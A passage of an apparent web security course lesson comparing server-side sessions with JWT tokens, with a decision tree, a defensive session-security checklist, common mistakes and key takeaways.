+├───────────────────┼─────────────────────────┼───────────────────────────┤
+│ Scalability       │ Needs shared store      │ Any server can verify     │
+├───────────────────┼─────────────────────────┼───────────────────────────┤
+│ Revocation        │ Easy (delete from store)│ Hard (need blocklist)     │
+├───────────────────┼─────────────────────────┼───────────────────────────┤
+│ Size              │ Small (just ID)         │ Larger (contains claims)  │
+├───────────────────┼─────────────────────────┼───────────────────────────┤
+│ Server Memory     │ Uses memory per session │ No memory needed          │
+├───────────────────┼─────────────────────────┼───────────────────────────┤
+│ Best For          │ Traditional web apps    │ APIs, microservices, SPAs │
+│                   │ Server-rendered pages   │ Mobile apps               │
+│                   │ Need instant revocation │ Cross-domain auth         │
+└───────────────────┴─────────────────────────┴───────────────────────────┘
+
+
+DECISION TREE:
+
+                    ┌──────────────────────────┐
+                    │ What are you building?   │
+                    └────────────┬─────────────┘
+                                 │
+              ┌──────────────────┼──────────────────┐
+              │                  │                  │
+              ▼                  ▼                  ▼
+    ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
+    │ Traditional     │  │ SPA + API       │  │ Microservices   │
+    │ Server-rendered │  │                 │  │                 │
+    │ Web App         │  │                 │  │                 │
+    └────────┬────────┘  └────────┬────────┘  └────────┬────────┘
+             │                    │                    │
+             ▼                    ▼                    ▼
+    ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
+    │ ✅ SESSIONS     │  │ ✅ JWT + Refresh│  │ ✅ JWT          │
+    │ (HttpOnly       │  │ (Access token   │  │ (Service-to-    │
+    │  cookies)       │  │  short-lived)   │  │  service auth)  │
+    └─────────────────┘  └─────────────────┘  └─────────────────┘
+
+
+HYBRID APPROACH (Common pattern):
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  Browser ←──── Session Cookie ────► Backend-for-Frontend (BFF)         │
+│                                              │                          │
+│                                              │ JWT                      │
+│                                              ▼                          │
+│                                     Microservices / APIs                │
+│                                                                         │
+│  Best of both worlds:                                                   │
+│  • HttpOnly session cookie for browser (secure, can't be stolen by XSS)│
+│  • JWT for service-to-service (stateless, scalable)                    │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## ✅ SECURITY CHECKLIST FOR SESSION 6
+```
+□ Session ID is cryptographically random (128+ bits entropy)
+□ Session ID regenerated after login (prevent fixation)
+□ Cookie flags set: HttpOnly, Secure, SameSite=Lax
+□ Idle timeout configured (15-30 minutes for sensitive apps)
+□ Absolute timeout configured (force re-auth after 8-24 hours)
+□ Proper logout: invalidate session + clear cookie
+□ Session binding considered (User-Agent, IP - with caution)
+□ HTTPS everywhere (Secure cookie flag requires this)
+□ Redis/distributed sessions for multi-server deployments
+□ Redis connection uses TLS
+□ Session data in Redis is minimal (no sensitive data if possible)
+□ Rate limit session creation (prevent DoS)
+```
+
+---
+
+## 🚫 COMMON MISTAKES
+```
+1. "We set HttpOnly, so XSS can't steal sessions"
+   → HttpOnly prevents JS access, but XSS can still make requests WITH the cookie.
+   → Still fix XSS vulnerabilities!
+
+2. "Session ID in URL is fine for sharing links"
+   → NEVER put session ID in URL. Gets logged, cached, shared, bookmarked.
+   → Always use cookies for session IDs.
+
+3. "We regenerate session ID periodically for security"
+   → Regenerate on LOGIN and PRIVILEGE CHANGE, not randomly.
+   → Random regeneration breaks legitimate users.
+
+4. "Sticky sessions solve our distributed problem"
+   → Sticky sessions fail when servers die.
+   → Use proper distributed sessions (Redis).
+
+5. "Redis is fast, we don't need TLS"
+   → Sessions contain sensitive data. Always TLS, even for Redis.
+
+6. "We store the entire user object in session"
+   → Sessions should be small. Store ID, fetch user when needed.
+   → Large sessions = memory issues + serialization overhead.
+
+7. "Cookie with Max-Age=0 deletes it"
+   → Correct! But also explicitly invalidate server-side session.
+   → Client could ignore the cookie deletion.
+```
+
+---
+
+
+##  SESSION 6 COMPLETE
+
+**Key Takeaways:**
+- HTTP is stateless; sessions add state via cookies
+- Cookie security flags are CRITICAL: ``HttpOnly``, Secure, ``SameSite``
+- Session fixation: ALWAYS regenerate session ID after login
+- Session hijacking: Mitigate with HTTPS, ``HttpOnly``, short timeouts
+- Distributed sessions (Redis) needed for multi-server deployments
+- Sessions vs Tokens: Different tools for different problems
 
